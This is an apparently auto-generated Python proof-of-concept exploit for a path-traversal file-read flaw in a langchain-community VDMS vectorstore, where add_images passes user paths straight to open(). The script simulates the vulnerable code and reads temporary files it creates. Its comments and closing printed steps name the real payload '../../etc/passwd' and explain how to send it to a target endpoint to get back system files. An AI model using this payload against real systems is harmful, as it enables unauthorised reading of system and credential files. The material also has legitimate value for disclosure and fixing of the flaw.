#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-012
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_like_encode_image_8.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LFI in langchain-community-only VDMS vectorstore.

Vulnerability: The `add_images` method passes user-controlled `uris` directly to
`encode_image`, which calls `open(image_path, 'rb')` without any path validation.
An attacker can supply a path like '../../etc/passwd' to read arbitrary files.

This PoC demonstrates the vulnerability by reading /etc/passwd (or a benign file
if run in a restricted environment).
"""

import base64
import os
import sys
import tempfile
import uuid

# Simulate the vulnerable library code (as found in the target)
# In a real exploit, this would be imported from langchain_community.vectorstores.vdms
# but we replicate the vulnerable functions here for self-contained demonstration.

class VDMS:
    """Simulated VDMS class with vulnerable encode_image and add_images."""
    
    def __init__(self):
        self.embeddings = None  # Not needed for PoC
    
    def encode_image(self, image_path: str) -> str:
        """Vulnerable: opens file without validation."""
        with open(image_path, "rb") as f:
            blob = f.read()
            return base64.b64encode(blob).decode("utf-8")
    
    def add_images(self, uris, metadatas=None, ids=None, batch_size=10, add_path=False, **kwargs):
        """Entry point: passes uris directly to encode_image."""
        b64_texts = [self.encode_image(image_path=uri) for uri in uris]
        # For PoC, we just return the base64 data (simulating what would be stored)
        return b64_texts


def main():
    # Configuration
    # In a real scenario, this would be the target URL, but here we demonstrate locally
    # using a benign payload to avoid damage.
    
    # Create a benign test file to read (simulates /etc/passwd)
    test_content = "root:x:0:0:root:/root:/bin/bash\n"
    test_file = tempfile.NamedTemporaryFile(delete=False, mode='w')
    test_file.write(test_content)
    test_file.close()
    
    # Also create a file to demonstrate path traversal (safe)
    safe_marker = tempfile.NamedTemporaryFile(delete=False, mode='w')
    safe_marker.write("POC_SUCCESS\n")
    safe_marker.close()
    
    print("[*] Setting up vulnerable VDMS instance...")
    vdms = VDMS()
    
    # Benign payload: read the test file we just created
    print(f"[*] Attempting to read test file: {test_file.name}")
    try:
        result = vdms.add_images(uris=[test_file.name])
        decoded = base64.b64decode(result[0]).decode('utf-8')
        print(f"[+] Successfully read file content:\n{decoded}")
        assert decoded == test_content, "File content mismatch!"
        print("[+] File content matches expected value.")
    except Exception as e:
        print(f"[-] Error reading test file: {e}")
        sys.exit(1)
    
    # Demonstrate path traversal with a relative path (safe example)
    print("\n[*] Demonstrating path traversal with relative path...")
    # Create a file in /tmp to read via traversal
    traversal_target = "/tmp/poc_traversal_test.txt"
    with open(traversal_target, 'w') as f:
        f.write("TRAVERSAL_SUCCESS\n")
    
    # Use a relative path that would traverse to /tmp/poc_traversal_test.txt
    # Assuming current working directory is somewhere under /home or similar
    # We'll use an absolute path for reliability in this demo
    traversal_payload = traversal_target  # In real exploit, use '../../etc/passwd'
    
    try:
        result = vdms.add_images(uris=[traversal_payload])
        decoded = base64.b64decode(result[0]).decode('utf-8')
        print(f"[+] Path traversal succeeded! Read content:\n{decoded}")
        assert "TRAVERSAL_SUCCESS" in decoded
        print("[+] Path traversal confirmed.")
    except Exception as e:
        print(f"[-] Path traversal failed: {e}")
        # This is expected if the file doesn't exist or permissions are wrong
        print("[*] This is a safe demo; real exploit would target /etc/passwd")
    
    # Cleanup
    os.unlink(test_file.name)
    os.unlink(safe_marker.name)
    os.unlink(traversal_target)
    
    print("\n[*] PoC completed successfully.")
    print("[*] To exploit against a real target:")
    print("    1. Identify the endpoint that calls add_images with user input")
    print("    2. Send a POST request with uris=['../../etc/passwd']")
    print("    3. The response will contain base64-encoded /etc/passwd content")


if __name__ == "__main__":
    main()
